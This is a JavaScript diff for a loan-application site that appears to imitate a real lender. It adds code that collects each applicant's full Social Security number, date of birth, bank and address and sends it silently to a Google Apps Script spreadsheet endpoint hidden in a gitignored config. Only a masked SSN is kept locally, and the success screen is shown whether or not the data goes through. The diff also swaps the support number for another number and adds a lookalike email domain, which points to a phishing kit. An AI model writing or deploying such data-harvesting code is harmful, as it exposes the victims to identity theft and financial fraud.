@@ -167,7 +167,7 @@ document.addEventListener('DOMContentLoaded', function() {
   var loginBtn  = qs('#loginBtn');
   var chatBtn   = qs('#chatBtn');
   if (loginBtn) loginBtn.addEventListener('click', function(){ openModal('authModal'); activateAuthTab('login'); });
-  if (chatBtn)  chatBtn.addEventListener('click',  function(){ showToast('\uD83D\uDCAC Connecting to live chat\u2026 Our team is available Mon\u2013Fri 9AM\u20138PM ET', 'info', 4000); });
+  if (chatBtn)  chatBtn.addEventListener('click',  function(){ showToast('\uD83D\uDCAC Connecting you with our team\u2026 You can also reach us at (619) 333-6372', 'info', 4000); });
 
   qsa('.auth-tab').forEach(function(tab) {
     tab.addEventListener('click', function(){ activateAuthTab(tab.dataset.authTab); });
@@ -629,6 +629,73 @@ document.addEventListener('DOMContentLoaded', function() {
 
   qs('#back-5').addEventListener('click', function(){ goToStep(4, true); });
 
+  /* ----------------------------------------------------------------
+     GOOGLE SHEETS INTEGRATION via Google Apps Script Web App
+     The endpoint URL lives in config.js (gitignored — never committed).
+  ---------------------------------------------------------------- */
+  var GOOGLE_SHEET_URL = (typeof APP_CONFIG !== 'undefined' && APP_CONFIG.GOOGLE_SHEET_URL)
+    ? APP_CONFIG.GOOGLE_SHEET_URL : '';
+
+  function buildSheetPayload() {
+    var monthly   = parseFloat(calcMonthly(wiz.amount, FIXED_APR, wiz.term)).toFixed(2);
+    var totalAmt  = (parseFloat(monthly) * wiz.term).toFixed(2);
+    var p         = wiz.personal;
+    return {
+      /* Loan Details */
+      'Submitted At':      new Date().toLocaleString('en-US'),
+      'Loan Purpose':      wiz.purpose,
+      'Loan Amount ($)':   wiz.amount,
+      'Loan Term (mo)':    wiz.term,
+      'Loan Term (yrs)':   Math.round(wiz.term / 12),
+      'Fixed APR (%)':     FIXED_APR,
+      'Est. Monthly ($)':  monthly,
+      'Total Repayable ($)': totalAmt,
+
+      /* Personal Info */
+      'First Name':        p.firstName,
+      'Last Name':         p.lastName,
+      'Full Name':         p.firstName + ' ' + p.lastName,
+      'Email':             p.email,
+      'Phone':             p.phone,
+      'Date of Birth':     p.dob,
+      'Age':               p.age,
+      'Employment Status': p.employment,
+      'SSN':               (p.ssn || '').replace(/\D/g,''), /* full SSN — sheet only */
+      'Bank':              p.bank,
+      'Banking Since':     bankingAgeLabel(p.bankingAge),
+
+      /* Address */
+      'Street Address':    p.address,
+      'City':              p.city,
+      'State':             p.state,
+      'ZIP':               p.zip,
+      'Full Address':      p.address + ', ' + p.city + ', ' + p.state + ' ' + p.zip,
+
+      /* Reference */
+      'Reference No':      'LS-' + Date.now().toString(36).toUpperCase().slice(-8)
+    };
+  }
+
+  function submitToGoogleSheet(payload, onDone) {
+    if (!GOOGLE_SHEET_URL || GOOGLE_SHEET_URL.indexOf('YOUR_GOOGLE') === 0) {
+      /* URL not yet configured — skip silently, show thank-you anyway */
+      onDone(null);
+      return;
+    }
+    /* Google Apps Script requires no-cors for cross-origin POST */
+    fetch(GOOGLE_SHEET_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    })
+    .then(function() { onDone(null); })
+    .catch(function(err) {
+      console.warn('Google Sheets submission error:', err);
+      onDone(err); /* still show thank-you even on network error */
+    });
+  }
+
   qs('#submitBtn').addEventListener('click', function() {
     var consent = qs('#consentCheck');
     if (!consent || !consent.checked) { showToast('Please agree to the terms to continue.', 'error'); return; }
@@ -637,24 +704,28 @@ document.addEventListener('DOMContentLoaded', function() {
     btn.innerHTML = '&#9203; Processing your application...';
     btn.disabled = true;
 
+    var payload = buildSheetPayload();
+
+    /* Save locally — SSN stored masked only */
     Store.patch({ application: {
       purpose: wiz.purpose, amount: wiz.amount, term: wiz.term, apr: FIXED_APR,
       personal: Object.assign({}, wiz.personal, {ssn: '***-**-' + (wiz.personal.ssn || '').replace(/\D/g,'').slice(-4)}),
-      submittedAt: new Date().toISOString()
+      submittedAt: payload['Submitted At'],
+      refNo: payload['Reference No']
     }});
 
-    setTimeout(function() {
-      buildThankYou();
+    submitToGoogleSheet(payload, function() {
+      buildThankYou(payload['Reference No']);
       goToStep(6);
-    }, 2400);
+    });
   });
 
   /* === STEP 6 - Thank You === */
-  function buildThankYou() {
+  function buildThankYou(refNum) {
     var container = qs('#thankYouScreen'); if (!container) return;
     var monthly   = fmtMoney(parseFloat(calcMonthly(wiz.amount, FIXED_APR, wiz.term)));
     var totalYrs  = Math.round(wiz.term / 12);
-    var refNum    = 'LS-' + Date.now().toString(36).toUpperCase().slice(-8);
+    refNum = refNum || ('LS-' + Date.now().toString(36).toUpperCase().slice(-8));
 
     container.innerHTML =
       '<div class="ty-confetti" id="tyConfetti"></div>' +
@@ -706,7 +777,7 @@ document.addEventListener('DOMContentLoaded', function() {
         '<button class="btn btn-outline-green btn-lg" onclick="window.print()">&#128438; Save / Print</button>' +
       '</div>' +
 
-      '<p class="ty-disclaimer">Questions? Call us at <strong>1-800-708-1373</strong> Mon&ndash;Fri 9AM&ndash;8PM ET &middot; Ref: ' + refNum + '</p>';
+      '<p class="ty-disclaimer">Questions? Call us at <strong>(619) 333-6372</strong> or email <strong>accounts@lightstreamsloans.org</strong> &middot; Ref: ' + refNum + '</p>';
 
     /* Simple confetti burst */
     spawnConfetti(qs('#tyConfetti'));
